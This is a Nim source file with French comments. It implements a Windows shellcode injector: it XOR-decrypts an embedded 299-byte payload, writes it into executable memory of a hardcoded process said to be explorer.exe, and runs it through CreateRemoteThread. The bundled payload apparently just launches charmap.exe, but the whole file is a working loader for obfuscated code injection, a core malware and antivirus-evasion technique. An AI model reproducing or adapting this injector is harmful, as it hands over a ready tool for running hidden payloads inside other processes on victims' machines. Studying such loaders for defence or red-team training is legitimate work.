import winim

proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
    let length = input.len
    var k = key
    result = newSeq[byte](length)
    for i in 0 ..< result.len:
        result[i] = uint8(input[i]) xor uint8(k)

proc injectShellcode[I, T](shellcode: array[I, T]): void =
    # Le process id est fixe (explorer.exe)
    # Le programme ne fonctionnera qu'avec du shellcode encrypté
    let processId: DWORD = 5732
    
    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
    defer: CloseHandle(pHandle)


    let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

    # Decrypte le shellcode avant de le copier en mémoire
    var decryptedShellcode = xorByteSeq(shellcode, 0x52)

    var bytesWritten: SIZE_T
    discard WriteProcessMemory(pHandle, rPtr, decryptedShellcode[0].addr, cast[SIZE_T](decryptedShellcode.len), addr bytesWritten)

    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
    defer: CloseHandle(tHandle)

when defined(windows):
    # Le shellcode charmap.exe est encrypté
    # par le programme encrypt.exe
    const shellcode: array[299, byte] = [
        byte 0xae, 0x1a, 0xd1, 0xb6, 0xa2, 0xba, 0x92, 0x52, 0x52, 0x52, 0x13, 0x03, 0x13, 0x02, 0x00,
0x03, 0x04, 0x1a, 0x63, 0x80, 0x37, 0x1a, 0xd9, 0x00, 0x32, 0x1a, 0xd9, 0x00, 0x4a, 0x1a,
0xd9, 0x00, 0x72, 0x1a, 0xd9, 0x20, 0x02, 0x1a, 0x5d, 0xe5, 0x18, 0x18, 0x1f, 0x63, 0x9b,
0x1a, 0x63, 0x92, 0xfe, 0x6e, 0x33, 0x2e, 0x50, 0x7e, 0x72, 0x13, 0x93, 0x9b, 0x5f, 0x13,
0x53, 0x93, 0xb0, 0xbf, 0x00, 0x13, 0x03, 0x1a, 0xd9, 0x00, 0x72, 0xd9, 0x10, 0x6e, 0x1a,
0x53, 0x82, 0xd9, 0xd2, 0xda, 0x52, 0x52, 0x52, 0x1a, 0xd7, 0x92, 0x26, 0x35, 0x1a, 0x53,
0x82, 0x02, 0xd9, 0x1a, 0x4a, 0x16, 0xd9, 0x12, 0x72, 0x1b, 0x53, 0x82, 0xb1, 0x04, 0x1a,
0xad, 0x9b, 0x13, 0xd9, 0x66, 0xda, 0x1a, 0x53, 0x84, 0x1f, 0x63, 0x9b, 0x1a, 0x63, 0x92,
0xfe, 0x13, 0x93, 0x9b, 0x5f, 0x13, 0x53, 0x93, 0x6a, 0xb2, 0x27, 0xa3, 0x1e, 0x51, 0x1e,
0x76, 0x5a, 0x17, 0x6b, 0x83, 0x27, 0x8a, 0x0a, 0x16, 0xd9, 0x12, 0x76, 0x1b, 0x53, 0x82,
0x34, 0x13, 0xd9, 0x5e, 0x1a, 0x16, 0xd9, 0x12, 0x4e, 0x1b, 0x53, 0x82, 0x13, 0xd9, 0x56,
0xda, 0x1a, 0x53, 0x82, 0x13, 0x0a, 0x13, 0x0a, 0x0c, 0x0b, 0x08, 0x13, 0x0a, 0x13, 0x0b,
0x13, 0x08, 0x1a, 0xd1, 0xbe, 0x72, 0x13, 0x00, 0xad, 0xb2, 0x0a, 0x13, 0x0b, 0x08, 0x1a,
0xd9, 0x40, 0xbb, 0x05, 0xad, 0xad, 0xad, 0x0f, 0x1a, 0xe8, 0x53, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x1a, 0xdf, 0xdf, 0x53, 0x53, 0x52, 0x52, 0x13, 0xe8, 0x63, 0xd9, 0x3d,
0xd5, 0xad, 0x87, 0xe9, 0xb2, 0x4f, 0x78, 0x58, 0x13, 0xe8, 0xf4, 0xc7, 0xef, 0xcf, 0xad,
0x87, 0x1a, 0xd1, 0x96, 0x7a, 0x6e, 0x54, 0x2e, 0x58, 0xd2, 0xa9, 0xb2, 0x27, 0x57, 0xe9,
0x15, 0x41, 0x20, 0x3d, 0x38, 0x52, 0x0b, 0x13, 0xdb, 0x88, 0xad, 0x87, 0x11, 0x68, 0x0e,
0x25, 0x3b, 0x3c, 0x36, 0x3d, 0x25, 0x21, 0x0e, 0x21, 0x2b, 0x21, 0x26, 0x37, 0x3f, 0x61,
0x60, 0x0e, 0x31, 0x3a, 0x33, 0x20, 0x3f, 0x33, 0x22, 0x7c, 0x37, 0x2a, 0x37, 0x52 ]

    when isMainModule:
        injectShellcode(shellcode)
